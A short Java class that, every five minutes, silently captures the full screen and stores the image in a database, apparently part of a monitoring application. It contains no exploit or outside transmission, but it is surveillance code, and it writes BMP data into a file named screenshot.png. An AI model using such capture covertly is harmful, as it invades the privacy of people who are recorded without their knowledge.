package application;

import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.image.BufferedImage;
import java.io.File;
import java.io.FileInputStream;
import java.io.InputStream;

import javax.imageio.ImageIO;

public class TakeScreenShot extends Thread {
	
	public void run() {
		while (true) {
				try {
					Thread.sleep(5000*60 );
				} catch (InterruptedException e) {
					break;
				}
				try {
					Rectangle screenRect = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
					BufferedImage capture = new Robot().createScreenCapture(screenRect);
					File f = new File("screenshot.png");
					ImageIO.write(capture, "bmp", f);

					// data base code
					InputStream i = new FileInputStream(f);
					DbConnect.insertScreenShot(i);
				} catch (Exception e) {
					
					break;
				}
		}	
	}
}
